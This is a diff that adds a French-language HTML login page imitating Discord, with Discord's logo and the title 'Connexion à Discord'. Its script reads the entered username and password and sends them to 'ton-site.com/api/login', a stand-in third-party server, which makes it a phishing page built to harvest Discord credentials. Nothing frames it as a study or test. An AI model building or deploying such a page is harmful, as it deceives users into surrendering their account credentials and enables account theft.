@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à Discord</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Discord_logo_2021.svg" alt="Discord Logo" class="logo">
+            <h1>Connexion à Discord</h1>
+        </div>
+        <form id="login-form">
+            <div class="input-group">
+                <label for="username">Pseudo</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="login-button">Se connecter</button>
+        </form>
+        <div class="footer">
+            <p>Pas encore de compte ? <a href="#">S'inscrire</a></p>
+            <p><a href="#">Mot de passe oublié ?</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            fetch("https://ton-site.com/api/login", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password
+                })
+            }).then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert("Authentification réussie!");
+                } else {
+                    alert("Échec de l'authentification!");
+                }
+            }).catch(error => {
+                alert("Erreur de connexion!");
+            });
+        });
+    </script>
+</body>
+</html>
